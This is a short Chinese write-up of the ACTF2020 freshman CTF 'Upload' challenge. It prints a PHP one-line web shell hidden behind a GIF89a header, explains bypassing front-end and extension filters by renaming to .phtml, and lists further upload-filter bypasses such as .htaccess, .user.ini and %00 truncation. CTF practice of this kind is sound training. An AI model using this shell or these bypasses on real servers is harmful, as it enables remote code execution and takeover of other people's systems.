# [ACTF2020 新生赛]Upload
TAG:PHP 任意文件上传    
## 解题过程：
![20210104101119](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104101119.png)  
检查源代码发现文件上传位置，发现存在前端过滤代码  
![20210104102215](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104102215.png)  
![20210104105857](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104105857.png)
鼠标放在灯泡图案上也能发现上传接口  
![20210104102712](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104102712.png)  
随意选择本地文件上传，并用burpsuite工具拦截数据包，将数据包发送到重发器进行任意文件上传测试，此时已经绕过前端检测    

![20210104103134](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104103134.png)  
一句话木马上传失败，说明存在后端过滤，修改文件后缀为phtml即可上传成功  
```GIF89a? <script language="php">eval($_REQUEST[shell])</script>```  
![20210104110715](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104110715.png)
使用蚁剑连接shell，在服务器根目录找到flag文件，打开终端使用cat命令查看文件内容获得flag  
![20210104110622](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104110622.png)  
## 题目分析  
此题为存在一定过滤的任意文件上传考察，在实战中也较为常见  
前端过滤可以轻松的使用抓包工具绕过，对文件上传的影响甚微  
当php后缀被过滤后，可以采用以下绕过方法：  
+ 利用中间件解析漏洞绕过检查
+ 上传.user.ini或.htaccess将合法拓展名文件当作php文件解析
+ %00截断绕过
+ php3、php4、php5、php7、phtml、phps、pht